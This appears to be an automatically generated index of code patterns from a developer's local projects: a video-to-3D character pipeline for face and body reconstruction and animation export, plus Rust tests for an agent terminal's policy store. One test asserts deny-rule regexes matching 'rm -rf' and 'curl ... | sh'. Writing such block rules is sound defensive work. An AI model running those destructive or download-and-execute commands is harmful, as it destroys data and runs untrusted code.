          "def _generate_manifest(self, name: str, config: Dict, exports: Dict) -> Dict[str, Any]:\n\"\"\"Generate complete character manifest.\"\"\"\nmanifest = {\n\"name\": name,\n\"version\": \"1.0\",\n\"config\": config,\n\"exports\": exports,\n\"shared_assets\": {\n\"skeleton\": str(self.shared_dir / \"skeleton\" / \"humanoid_skeleton.fbx\"),\n\"animations\": str(self.shared_dir / \"animations\"),",
          "def list_characters(self) -> list:\n\"\"\"List all created characters.\"\"\"\ncharacters = []\nfor char_dir in self.characters_dir.iterdir():\nif char_dir.is_dir():\nconfig_path = char_dir / \"config.json\"\nif config_path.exists():\nwith open(config_path) as f:\nconfig = json.load(f)\ncharacters.append({",
          "def get_available_body_types(self) -> list:\n\"\"\"List available body type presets.\"\"\"\n# These would be populated when Daz exports are ready\nreturn [\n\"athletic_lean\",\n\"athletic_medium\",\n\"athletic_heavy\",\n\"average_lean\",\n\"average_medium\",\n\"average_heavy\",",
          "def get_available_hair_styles(self) -> list:\n\"\"\"List available hair style presets.\"\"\"\nreturn [\n\"short_01\", \"short_02\", \"short_03\",\n\"medium_01\", \"medium_02\",\n\"long_01\", \"long_02\",\n\"buzz\", \"bald\",\n\"curly_short\", \"curly_medium\",\n]\n",
          "def main():"
        ],
        "class_defs": [
          "class CharacterConfig:",
          "class CharacterPipeline:"
        ],
        "imports": [
          "import json",
          "import shutil",
          "import sys",
          "from pathlib import Path",
          "from dataclasses import dataclass",
          "from typing import Optional, Dict, Any",
          "import argparse",
          "from extract_face import process_video"
        ],
        "comments": [
          "# Add scripts directory to path for local imports",
          "# Ensure directories exist",
          "# Create character directory",
          "# Step 1: Extract face from video",
          "# Step 2: Generate character config",
          "# Step 3: Prepare for Unity export",
          "# Step 4: Generate manifest",
          "# Copy face mesh",
          "# Copy face texture",
          "# Create Unity-specific config",
          "# These would be populated when Daz exports are ready"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/blender_create_base.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import bpy",
          "import os"
        ],
        "comments": [
          "# Clear scene",
          "# Create armature (skeleton) for humanoid",
          "# Get armature data",
          "# We'll create a basic humanoid skeleton",
          "# This is simplified - full version would have all 65+ bones",
          "# (name, head, tail, parent)",
          "# Left arm",
          "# Right arm",
          "# Left leg",
          "# Right leg",
          "# Create bones",
          "# Exit edit mode",
          "# Export to FBX"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/extract_face.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, max_faces: int = 2):",
          "def _ensure_model(self):\n\"\"\"Download model if not present.\"\"\"\nself.MODEL_PATH.parent.mkdir(parents=True, exist_ok=True)\nif not self.MODEL_PATH.exists():\nprint(f\"Downloading face landmarker model...\")\nurllib.request.urlretrieve(self.MODEL_URL, self.MODEL_PATH)\nprint(f\"Model saved to {self.MODEL_PATH}\")\n\ndef extract_from_frame(self, frame: np.ndarray, frame_idx: int) -> List[FaceData]:\n\"\"\"Extract face data from a single frame. Returns list for multi-face.\"\"\"",
          "def extract_from_frame(self, frame: np.ndarray, frame_idx: int) -> List[FaceData]:\n\"\"\"Extract face data from a single frame. Returns list for multi-face.\"\"\"\nrgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\nh, w = frame.shape[:2]\n\n# Create MediaPipe Image\nmp_image = mp.Image(image_format=mp.ImageFormat.SRGB, data=rgb_frame)\n\n# Detect faces\nresult = self.detector.detect(mp_image)",
          "def extract_from_video(self, video_path: str, sample_rate: int = 5) -> List[List[FaceData]]:\n\"\"\"Extract face data from video, sampling every N frames.\"\"\"\ncap = cv2.VideoCapture(video_path)\nall_frames_data = []\nframe_idx = 0\n\ntotal_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))\nprint(f\"Total frames: {total_frames}, sampling every {sample_rate} frames\")\n\nwhile cap.isOpened():",
          "def get_best_frames(self, video_path: str, num_faces: int = 2) -> List[Tuple[FaceData, np.ndarray]]:\n\"\"\"Get the best quality face frames for each detected person.\"\"\"\ncap = cv2.VideoCapture(video_path)\n\n# Track best frame per face ID\nbest_per_face = {}  # face_id -> (FaceData, frame, confidence)\n\nframe_idx = 0\nsample_rate = 10  # Sample every 10 frames for speed\n",
          "def __init__(self):",
          "def _generate_triangulation(self) -> np.ndarray:\n\"\"\"Generate face triangulation from MediaPipe topology.\"\"\"\n# Simplified triangulation for key face regions\n# MediaPipe face mesh has 478 landmarks\ntriangles = []\n\n# Create a simple triangulation for the face\n# This creates triangles connecting adjacent landmarks\n# Full implementation would use MediaPipe's canonical triangulation\n",
          "def build_mesh(self, landmarks_3d: np.ndarray, scale: float = 100.0) -> trimesh.Trimesh:\n\"\"\"Build a trimesh from 3D landmarks.\"\"\"\nvertices = landmarks_3d.copy()\nvertices[:, 0] -= 0.5  # Center X\nvertices[:, 1] -= 0.5  # Center Y\nvertices *= scale\nvertices[:, 1] *= -1  # Flip Y\n\n# Create valid triangles only\nvalid_triangles = []",
          "def export_obj(self, mesh: trimesh.Trimesh, output_path: str):\n\"\"\"Export mesh to OBJ format.\"\"\"\nmesh.export(output_path, file_type='obj')\nprint(f\"Exported mesh to {output_path}\")\n\ndef export_fbx_compatible(self, landmarks_3d: np.ndarray, output_dir: str, name: str):\n\"\"\"Export in a format compatible with FBX conversion.\"\"\"",
          "def export_fbx_compatible(self, landmarks_3d: np.ndarray, output_dir: str, name: str):\n\"\"\"Export in a format compatible with FBX conversion.\"\"\"\noutput_dir = Path(output_dir)\noutput_dir.mkdir(parents=True, exist_ok=True)\n\nmesh = self.build_mesh(landmarks_3d)\nobj_path = output_dir / f\"{name}_face.obj\"\nself.export_obj(mesh, str(obj_path))\n\njson_path = output_dir / f\"{name}_landmarks.json\"",
          "def extract_texture(self, frame: np.ndarray, landmarks_2d: np.ndarray,",
          "def save_texture(self, texture: np.ndarray, output_path: str):\n\"\"\"Save texture to file.\"\"\"\ncv2.imwrite(output_path, texture)\nprint(f\"Saved texture to {output_path}\")\n\n\ndef process_video(video_path: str, output_dir: str, name: Optional[str] = None, num_faces: int = 2, select_face: Optional[int] = None):\n\"\"\"Main processing function for multi-face extraction.\"\"\"",
          "def process_video(video_path: str, output_dir: str, name: Optional[str] = None, num_faces: int = 2, select_face: Optional[int] = None):\n\"\"\"Main processing function for multi-face extraction.\"\"\"\nvideo_path = Path(video_path)\noutput_dir = Path(output_dir)\noutput_dir.mkdir(parents=True, exist_ok=True)\n\nif name is None:\nname = video_path.stem\n\nprint(f\"Processing: {video_path}\")"
        ],
        "class_defs": [
          "class FaceData:",
          "class FaceExtractor:",
          "class FaceMeshBuilder:",
          "class TextureExtractor:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "import json",
          "import argparse",
          "from dataclasses import dataclass",
          "from typing import Optional, Tuple, List",
          "import trimesh",
          "import urllib.request",
          "import os",
          "import mediapipe as mp",
          "from mediapipe.tasks import python as mp_python",
          "from mediapipe.tasks.python import vision"
        ],
        "comments": [
          "# MediaPipe Tasks API",
          "# Create face landmarker",
          "# Face oval indices for contour",
          "# Create MediaPipe Image",
          "# Detect faces",
          "# Extract 2D landmarks (normalized to image size)",
          "# Extract 3D landmarks (normalized)",
          "# Extract face oval",
          "# Estimate confidence from detection",
          "# Track best frame per face ID",
          "# Return list of (face_data, frame) tuples",
          "# Simplified triangulation for key face regions",
          "# MediaPipe face mesh has 478 landmarks",
          "# Create a simple triangulation for the face",
          "# This creates triangles connecting adjacent landmarks",
          "# Full implementation would use MediaPipe's canonical triangulation",
          "# Forehead/face outline",
          "# Basic face fill",
          "# Create valid triangles only",
          "# Fallback: create a simple point cloud mesh",
          "# Find face bounding box",
          "# Add padding",
          "# Crop and resize",
          "# Extract faces",
          "# Filter to specific face if requested (1-indexed for user convenience)",
          "# Build mesh",
          "# Extract texture",
          "# Save combined manifest"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/realistic_face_reconstruction.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _compute_flame_landmarks(self):\n\"\"\"Compute the 3D positions of 68 landmarks on FLAME template\"\"\"\nvertices = self.flame_template.vertices\nfaces = self.flame_template.faces\n\nlandmarks = []\nfor i in range(len(self.full_lmk_faces_idx)):\nface_idx = self.full_lmk_faces_idx[i]\nbary = self.full_lmk_bary_coords[i]\n",
          "def detect_landmarks(self, image: np.ndarray):\n\"\"\"\nDetect 68 3D facial landmarks in an image\n\nReturns:\nlandmarks_2d: (68, 2) array of 2D pixel coordinates\nlandmarks_3d: (68, 3) array of 3D positions (x, y, depth)\n\"\"\"",
          "def reconstruct_face(self, image: np.ndarray, texture_resolution: int = 1024):\n\"\"\"\nReconstruct a 3D face from an image\n\nArgs:\nimage: BGR image\ntexture_resolution: Resolution of output texture\n\nReturns:\nmesh: trimesh.Trimesh with face mesh and texture",
          "def _normalize_landmarks(self, landmarks_3d: np.ndarray) -> np.ndarray:\n\"\"\"Normalize detected landmarks to match FLAME template scale and position\"\"\"\n# Center around nose tip (landmark 30)\nnose_tip = landmarks_3d[30]\ncentered = landmarks_3d - nose_tip\n\n# Scale to match FLAME template (based on eye distance)\n# FLAME landmarks: left eye corners ~8,9, right eye corners ~36,45\nflame_eye_left = self.flame_landmarks[36]\nflame_eye_right = self.flame_landmarks[45]",
          "def _deform_mesh(self, target_landmarks: np.ndarray) -> np.ndarray:\n\"\"\"\nDeform FLAME template mesh to match target landmarks using RBF interpolation\n\"\"\"",
          "def _compute_uv_coords(self, landmarks_2d: np.ndarray, img_shape: tuple) -> np.ndarray:\n\"\"\"\nCompute UV coordinates for each vertex based on face region\n\"\"\"",
          "def _extract_texture(self, image: np.ndarray, landmarks_2d: np.ndarray, resolution: int) -> Image.Image:\n\"\"\"\nExtract face texture from image\n\"\"\"",
          "def _create_textured_mesh(self, vertices: np.ndarray, uv_coords: np.ndarray, texture: Image.Image) -> trimesh.Trimesh:\n\"\"\"\nCreate a trimesh with embedded texture\n\"\"\"",
          "def process_image(self, image_path: str, output_path: str = None):\n\"\"\"\nProcess a single image and save the result\n\"\"\"",
          "def main():\n\"\"\"Test the reconstructor on performer images\"\"\"\nimport sys\n\n# Initialize reconstructor\nprint(\"=\" * 60)\nprint(\"REALISTIC FACE RECONSTRUCTION\")\nprint(\"=\" * 60)\n\nreconstructor = RealisticFaceReconstructor()"
        ],
        "class_defs": [
          "class RealisticFaceReconstructor:"
        ],
        "imports": [
          "import numpy as np",
          "import cv2",
          "import torch",
          "import trimesh",
          "from pathlib import Path",
          "from PIL import Image",
          "import face_alignment",
          "from scipy.spatial import Delaunay",
          "from scipy.interpolate import RBFInterpolator",
          "from trimesh.visual.material import PBRMaterial",
          "from trimesh.visual import TextureVisuals",
          "import sys"
        ],
        "comments": [
          "# Detect device",
          "# Load face_alignment for 3D landmark detection",
          "# Load FLAME template mesh",
          "# Load landmark embedding (maps 68 landmarks to FLAME mesh)",
          "# Get the 68 landmark indices from FLAME",
          "# Pre-compute FLAME landmark positions from template",
          "# Get face vertices",
          "# Interpolate position using barycentric coordinates",
          "# Convert BGR to RGB if needed",
          "# Detect landmarks",
          "# Get first face",
          "# Detect landmarks",
          "# Normalize detected 3D landmarks to match FLAME scale",
          "# Deform FLAME template to match detected landmarks",
          "# Create UV coordinates for texture mapping",
          "# Extract face texture",
          "# Create textured mesh",
          "# Center around nose tip (landmark 30)",
          "# Scale to match FLAME template (based on eye distance)",
          "# FLAME landmarks: left eye corners ~8,9, right eye corners ~36,45",
          "# Align with FLAME template (translate to match nose position)",
          "# Use thin-plate spline (RBF) interpolation to deform the mesh",
          "# Control points: FLAME landmarks -> target landmarks",
          "# Compute displacement field",
          "# Create RBF interpolator for each dimension",
          "# Using thin_plate_spline kernel for smooth deformation",
          "# Project vertices to UV space using detected face region",
          "# Get face bounding box from landmarks",
          "# Add padding",
          "# Normalize FLAME vertex positions to UV space",
          "# Map vertices to UV [0, 1]",
          "# X -> U, Y -> V (inverted for image coordinates)",
          "# Get face bounding box",
          "# Add padding",
          "# Crop face region",
          "# Convert to RGB",
          "# Resize to texture resolution",
          "# Create PBR material with texture",
          "# Create visual with texture coordinates",
          "# Create mesh",
          "# Save mesh",
          "# Save texture",
          "# Initialize reconstructor",
          "# Test on performer images",
          "# Find face image"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/body_reconstruction.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def process_frame(self, frame: np.ndarray, frame_idx: int) -> Optional[BodyFrame]:\n\"\"\"Process a single frame and extract body data.\"\"\"\nif self.pose_detector is None:\nreturn None\n\nrgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\nh, w = frame.shape[:2]\n\n# Use tasks API\nmp_image = mp.Image(image_format=mp.ImageFormat.SRGB, data=rgb)",
          "def _calculate_pose_angles(self, landmarks: np.ndarray) -> Dict[str, float]:\n\"\"\"Calculate joint angles from landmarks.\"\"\"\nangles = {}\n\n# Helper to calculate angle between three points\ndef angle_3p(p1, p2, p3):\nv1 = p1 - p2\nv2 = p3 - p2\ncos_angle = np.dot(v1, v2) / (np.linalg.norm(v1) * np.linalg.norm(v2) + 1e-6)\nreturn np.arccos(np.clip(cos_angle, -1, 1))",
          "def angle_3p(p1, p2, p3):",
          "def extract_measurements(self) -> BodyMeasurements:\n\"\"\"Extract body measurements from accumulated frames.\"\"\"\nif not self.body_frames:\nraise ValueError(\"No body frames processed\")\n\n# Average measurements across frames with good visibility\nall_measurements = []\n\nfor frame in self.body_frames:\nlm = frame.landmarks_3d",
          "def _measure_single_frame(self, frame: BodyFrame) -> Dict:\n\"\"\"Fallback measurement from single frame.\"\"\"\nlm = frame.landmarks_3d\nreturn {\n'height': 1.0,\n'shoulder_width': np.linalg.norm(lm[11] - lm[12]),\n'chest_width': np.linalg.norm(lm[11] - lm[12]) * 0.9,\n'waist_width': np.linalg.norm(lm[23] - lm[24]) * 0.85,\n'hip_width': np.linalg.norm(lm[23] - lm[24]),\n'arm_length': np.linalg.norm(lm[11] - lm[15]),",
          "def build_body_mesh(self, measurements: BodyMeasurements,",
          "def _generate_body_sections(self, shoulder_w, chest_w, waist_w, hip_w,",
          "def _sections_to_mesh(self, sections: List[Tuple[float, np.ndarray]]) -> trimesh.Trimesh:\n\"\"\"Convert cross-sections to a connected mesh.\"\"\"\nvertices = []\nfaces = []\n\nfor i, (height, profile) in enumerate(sections):\n# Add vertices for this section\nfor x, z in profile:\nvertices.append([x, height, z])\n",
          "def _add_limbs(self, mesh: trimesh.Trimesh, measurements: BodyMeasurements,",
          "def _create_limb(self, start: List[float], end: List[float],",
          "def _add_head(self, mesh: trimesh.Trimesh, head_radius: float) -> trimesh.Trimesh:\n\"\"\"Add a head to the body mesh.\"\"\"\n# Get neck position (top of body)\nmax_y = mesh.vertices[:, 1].max()\n\n# Create head sphere\nhead = trimesh.creation.icosphere(radius=head_radius, subdivisions=3)\nhead.vertices[:, 1] += max_y + head_radius * 0.8\n\nreturn trimesh.util.concatenate([mesh, head])",
          "def _add_male_anatomy(self, mesh: trimesh.Trimesh,",
          "def export_mesh(self, mesh: trimesh.Trimesh, output_path: Path,",
          "def __init__(self):",
          "def process_frame(self, frame: np.ndarray, frame_idx: int) -> Optional[Dict]:\n\"\"\"Process a frame and extract face mesh data.\"\"\"\nrgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\nh, w = frame.shape[:2]\n\nif self.face_detector is None:\n# Basic face detection without landmarks\nreturn self._basic_face_detection(frame, frame_idx)\n\n# Use tasks API",
          "def _basic_face_detection(self, frame: np.ndarray, frame_idx: int) -> Optional[Dict]:\n\"\"\"Basic face detection without landmarks - just extract face region.\"\"\"\n# Use OpenCV's Haar cascade for basic face detection\ngray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\nface_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')\nfaces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(60, 60))\n\nif len(faces) == 0:\nreturn None\n",
          "def build_face_mesh(self) -> Optional[trimesh.Trimesh]:\n\"\"\"Build 3D face mesh from accumulated landmarks.\"\"\"\nif not self.accumulated_landmarks:\nreturn None\n\n# Average landmarks across frames for stable geometry\nall_landmarks = np.array([d['landmarks'] for d in self.accumulated_landmarks])\navg_landmarks = np.mean(all_landmarks, axis=0)\n\n# MediaPipe provides face mesh topology",
          "def build_textured_face_mesh(self, face_size: float = 0.25) -> Tuple[trimesh.Trimesh, Optional[np.ndarray]]:\n\"\"\"Build face mesh with UV-mapped texture from best frame.\"\"\"\nmesh = self.build_face_mesh()\nif mesh is None:\nreturn None, None\n\n# Scale to appropriate size\nmesh.vertices *= face_size\n\n# Get best texture (largest, sharpest)",
          "def export_face(self, output_dir: Path) -> Dict:\n\"\"\"Export face mesh and texture.\"\"\"\noutput_dir = Path(output_dir)\noutput_dir.mkdir(parents=True, exist_ok=True)\n\nmesh, texture = self.build_textured_face_mesh()\n\nif mesh is None:\nreturn {'success': False}\n",
          "def process_video_for_reconstruction(video_path: Path, output_dir: Path,"
        ],
        "class_defs": [
          "class BodyMeasurements:",
          "class BodyFrame:",
          "class BodyReconstructor:",
          "class FaceReconstructor:"
        ],
        "imports": [
          "import numpy as np",
          "import cv2",
          "import json",
          "import trimesh",
          "from pathlib import Path",
          "from typing import List, Dict, Optional, Tuple",
          "from dataclasses import dataclass",
          "from scipy.spatial import Delaunay",
          "from scipy.interpolate import griddata",
          "import logging",
          "import mediapipe as mp",
          "from mediapipe.tasks import python as mp_tasks",
          "from mediapipe.tasks.python import vision",
          "import mediapipe as mp",
          "from mediapipe import solutions",
          "import argparse"
        ],
        "comments": [
          "# MediaPipe imports - use tasks API for newer versions",
          "# Fallback to legacy solutions API",
          "# Body shape parameters",
          "# MediaPipe landmark indices",
          "# Use new tasks API",
          "# Use tasks API",
          "# Extract landmarks as numpy array",
          "# Extract 2D landmarks (scaled to image size)",
          "# Visibility scores",
          "# Estimate view angle from shoulder positions",
          "# Calculate pose angles",
          "# Helper to calculate angle between three points",
          "# Elbow angles",
          "# Knee angles",
          "# Hip angles",
          "# Shoulder angles",
          "# Average measurements across frames with good visibility",
          "# Only use frames with good visibility",
          "# Calculate distances",
          "# Torso length (average of left and right)",
          "# Arm length",
          "# Leg length",
          "# Head size (ear to ear through face)",
          "# Estimate chest width from shoulder angle",
          "# Estimate waist (narrower than chest)",
          "# Total height",
          "# Use first frame if no good frames",
          "# Average all measurements",
          "# Estimate body composition from proportions",
          "# Wider shoulders relative to hips = more muscular",
          "# Waist to hip ratio indicates body fat",
          "# Scale factor to get reasonable world units",
          "# Body proportions",
          "# Build body as connected mesh sections",
          "# Generate body cross-sections at different heights",
          "# Connect sections into mesh",
          "# Add limbs",
          "# Add head",
          "# Add anatomical details for male",
          "# Heights from bottom to top (0 = ground level)",
          "# Crotch level",
          "# Waist level",
          "# Chest level",
          "# Shoulder level",
          "# Neck level",
          "# Width at each height",
          "# Below crotch - narrow for leg separation",
          "# Hip/pelvis region",
          "# Waist",
          "# Chest",
          "# Shoulders/neck",
          "# Generate ellipse cross-section with anatomical shape",
          "# Modify ellipse for body shape",
          "# Basic ellipse",
          "# Add muscle definition for males",
          "# Pec muscles",
          "# Back curvature",
          "# Add vertices for this section",
          "# Connect adjacent sections with faces",
          "# Two triangles per quad",
          "# Leg parameters",
          "# Arm parameters",
          "# Left leg",
          "# Right leg",
          "# Left arm",
          "# Right arm (mirrored)",
          "# Direction and length",
          "# Create cylinder along Y axis then transform",
          "# Connect rings",
          "# Transform to align with direction",
          "# Default direction is [0, 1, 0]",
          "# Rotation axis and angle",
          "# Rodrigues rotation",
          "# Translate to start position",
          "# Get neck position (top of body)",
          "# Create head sphere",
          "# Position at crotch",
          "# Size based on body proportions",
          "# Create anatomical mesh",
          "# Rotate to point forward/down",
          "# Glans",
          "# Scrotum",
          "# Use new tasks API for face detection",
          "# Basic face detection without landmarks",
          "# Use tasks API",
          "# Extract 3D landmarks",
          "# Store with frame data",
          "# Extract face texture region",
          "# Get face bounding box",
          "# Expand slightly",
          "# Use OpenCV's Haar cascade for basic face detection",
          "# Use largest face",
          "# Extract face crop",
          "# Average landmarks across frames for stable geometry",
          "# MediaPipe provides face mesh topology",
          "# Use the landmark positions directly as vertices",
          "# Scale and center",
          "# Create faces using Delaunay triangulation on the 2D projection",
          "# Filter degenerate faces",
          "# Scale to appropriate size",
          "# Get best texture (largest, sharpest)",
          "# Score textures by size and clarity",
          "# Laplacian variance as sharpness metric",
          "# Resize to power of 2 for better GPU handling",
          "# Export mesh",
          "# Export texture",
          "# Export UV coordinates",
          "# Normalize to 0-1 range",
          "# Sample frames evenly",
          "# Process body",
          "# Process face",
          "# Build body mesh",
          "# Build face mesh",
          "# Save measurements"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 8,
        "decorators": [
          "@dataclass",
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/export_animation.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, fps: float = 30.0):",
          "def load_poses(self, pose_path: Path) -> np.ndarray:\n\"\"\"Load numpy pose data.\"\"\"\nreturn np.load(str(pose_path))\n\ndef poses_to_keyframes(self, poses: np.ndarray) -> List[AnimationKeyframe]:\n\"\"\"Convert MediaPipe poses to humanoid keyframes.\"\"\"",
          "def poses_to_keyframes(self, poses: np.ndarray) -> List[AnimationKeyframe]:\n\"\"\"Convert MediaPipe poses to humanoid keyframes.\"\"\"\nkeyframes = []\n\nfor i, pose in enumerate(poses):\ntime = i / self.fps\n\nbone_transforms = {}\n\n# Calculate hip position (root)",
          "def _calculate_bone_rotations(self, bone_transforms: Dict):\n\"\"\"Calculate bone rotations from joint positions.\"\"\"\n# For each bone, calculate rotation to point toward child\nfor bone_name, parent_name in HUMANOID_HIERARCHY.items():\nif bone_name not in bone_transforms:\ncontinue\nif parent_name is None:\ncontinue\n\n# Find child bone",
          "def _direction_to_quaternion(self, direction: np.ndarray, up: np.ndarray) -> np.ndarray:\n\"\"\"Convert direction vector to quaternion.\"\"\"\nforward = direction / (np.linalg.norm(direction) + 1e-8)\nright = np.cross(up, forward)\nright = right / (np.linalg.norm(right) + 1e-8)\nup = np.cross(forward, right)\n\n# Build rotation matrix\nm = np.array([right, up, forward]).T\n",
          "def export_json(self, keyframes: List[AnimationKeyframe], output_path: Path):\n\"\"\"Export to JSON format for Unity/Unreal.\"\"\"\ndata = {\n\"fps\": self.fps,\n\"frame_count\": len(keyframes),\n\"duration\": len(keyframes) / self.fps,\n\"bones\": list(HUMANOID_HIERARCHY.keys()),\n\"keyframes\": []\n}\n",
          "def export_bvh(self, keyframes: List[AnimationKeyframe], output_path: Path):\n\"\"\"Export to BVH motion capture format.\"\"\"\nlines = []\n\n# HIERARCHY section\nlines.append(\"HIERARCHY\")\nlines.append(\"ROOT Hips\")\nlines.append(\"{\")\nlines.append(\"  OFFSET 0.0 0.0 0.0\")\nlines.append(\"  CHANNELS 6 Xposition Yposition Zposition Zrotation Xrotation Yrotation\")",
          "def _write_bvh_joint(self, lines: List[str], parent: str, indent: int):\n\"\"\"Recursively write BVH joint hierarchy.\"\"\"\nspaces = \"  \" * indent\n\nchildren = [b for b, p in HUMANOID_HIERARCHY.items() if p == parent]\n\nfor child in children:\nlines.append(f\"{spaces}JOINT {child}\")\nlines.append(f\"{spaces}{{\")\nlines.append(f\"{spaces}  OFFSET 0.0 10.0 0.0\")  # Default offset",
          "def _quaternion_to_euler(self, q: List[float]) -> List[float]:\n\"\"\"Convert quaternion [x, y, z, w] to Euler angles [z, x, y] in degrees.\"\"\"\nx, y, z, w = q\n\n# Roll (x-axis rotation)\nsinr_cosp = 2 * (w * x + y * z)\ncosr_cosp = 1 - 2 * (x * x + y * y)\nroll = np.arctan2(sinr_cosp, cosr_cosp)\n\n# Pitch (y-axis rotation)",
          "def export_performer(performer_dir: Path, output_format: str = \"json\"):\n\"\"\"Export animation from performer directory.\"\"\"\nperformer_dir = Path(performer_dir)\n\n# Find pose file\npose_path = None\nfor name in [\"retargeted_poses.npy\", \"poses.npy\"]:\npath = performer_dir / name\nif path.exists():\npose_path = path",
          "def main():"
        ],
        "class_defs": [
          "class AnimationKeyframe:",
          "class AnimationExporter:"
        ],
        "imports": [
          "import numpy as np",
          "from pathlib import Path",
          "import json",
          "from typing import Dict, List, Optional, Tuple",
          "from dataclasses import dataclass",
          "import argparse"
        ],
        "comments": [
          "# MediaPipe to Humanoid bone mapping",
          "# Standard humanoid skeleton hierarchy",
          "# Calculate hip position (root)",
          "# Map MediaPipe landmarks to humanoid bones",
          "# Position relative to hip",
          "# Calculate rotations from positions",
          "# For each bone, calculate rotation to point toward child",
          "# Find child bone",
          "# Direction vector",
          "# Calculate rotation quaternion",
          "# Build rotation matrix",
          "# Convert to quaternion",
          "# HIERARCHY section",
          "# Build hierarchy recursively",
          "# MOTION section",
          "# Write frame data",
          "# Convert quaternion to Euler (ZXY order for BVH)",
          "# Recurse",
          "# Roll (x-axis rotation)",
          "# Pitch (y-axis rotation)",
          "# Yaw (z-axis rotation)",
          "# Convert to degrees and return in ZXY order",
          "# Find pose file",
          "# Direct pose file"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": [
          "@dataclass"
        ]
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/motion_pipeline_venv/lib/python3.14/site-packages/commonmark",
    "name": "commonmark",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests",
    "name": "tests",
    "languages": [
      "Rust",
      "JavaScript"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/phase5_integration.rs",
        "function_defs": [
          "fn test_phase5_policy_full_lifecycle() {",
          "fn test_phase5_multi_agent_coordination() {",
          "fn test_phase5_policy_reject_workflow() {",
          "fn test_phase5_multiple_versions_rollback() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use sam_terminal::policy_store::{PolicyStore, PolicyDiff, PolicyDiffAdd};",
          "use sam_terminal::agents::AgentCoordinator;",
          "use std::fs;"
        ],
        "macros": [
          "assert_eq!(initial_rules.len(), 0, \"Should start with no rules\");",
          "meta: Some(serde_json::json!({",
          "println!(\"[PHASE5 TEST] Proposed suggestion: {}\", suggestion_id);",
          "assert_eq!(suggestions.len(), 1, \"Should have 1 pending suggestion\");",
          "assert_eq!(suggestions[0][\"status\"].as_str().unwrap(), \"pending\");",
          "assert_eq!(suggestions[0][\"proposed_by\"].as_str().unwrap(), \"integration_test_tr",
          "println!(\"[PHASE5 TEST] Applied version: {}\", version);",
          "assert_eq!(rules.len(), 2, \"Should have 2 rules after apply\");",
          "assert!(patterns.contains(&r\"\\brm\\s+-rf\\b\".to_string()));",
          "assert!(patterns.contains(&r\"\\bcurl\\b.*\\|.*sh\".to_string()));",
          "assert_eq!(rule.effect, \"deny\");",
          "assert_eq!(rule.added_by.as_ref().unwrap(), \"test_admin\");",
          "assert_eq!(suggestions_after[0][\"status\"].as_str().unwrap(), \"applied\");",
          "assert_eq!(suggestions_after[0][\"reviewed_by\"].as_str().unwrap(), \"test_admin\");",
          "assert_eq!(rules_after_rollback.len(), 0, \"Rules should be removed after rollbac",
          "println!(\"[PHASE5 TEST] \u2705 Policy lifecycle test passed\");",
          "println!(\"[PHASE5 TEST] Registered agents: {}, {}, {}\", agent1, agent2, agent3);",
          "assert_eq!(agents.len(), 3, \"Should have 3 agents\");",
          "assert_eq!(trainer.status, \"idle\");",
          "assert_eq!(classifier.status, \"idle\");",
          "assert_eq!(trainer_working.status, \"running\");",
          "assert_eq!(trainer_working.last_action, Some(\"training_model\".to_string()));",
          "assert_eq!(trainer_working.last_score, Some(85));",
          "assert_eq!(classifier_working.status, \"running\");",
          "assert_eq!(classifier_working.last_score, Some(92));",
          "assert_eq!(trainer_blocked.status, \"blocked\");",
          "assert_eq!(agents_final.len(), 2, \"Should have 2 agents after unregister\");",
          "assert!(agents_final.iter().all(|a| a.id != agent2));",
          "println!(\"[PHASE5 TEST] \u2705 Multi-agent coordination test passed\");",
          "assert_eq!(suggestions[0][\"status\"].as_str().unwrap(), \"rejected\");",
          "assert_eq!(suggestions[0][\"reviewed_by\"].as_str().unwrap(), \"security_reviewer\")",
          "assert_eq!(rules.len(), 0, \"Rejected suggestions should not add rules\");",
          "println!(\"[PHASE5 TEST] \u2705 Policy reject workflow test passed\");",
          "assert_eq!(store.list_rules().unwrap().len(), 1);",
          "assert_eq!(store.list_rules().unwrap().len(), 2);",
          "assert_eq!(store.list_rules().unwrap().len(), 1);",
          "assert_eq!(store.list_rules().unwrap().len(), 0);",
          "println!(\"[PHASE5 TEST] \u2705 Multiple versions rollback test passed\");"
        ],
        "derives": [],
        "error_handling": 45
      },
      {
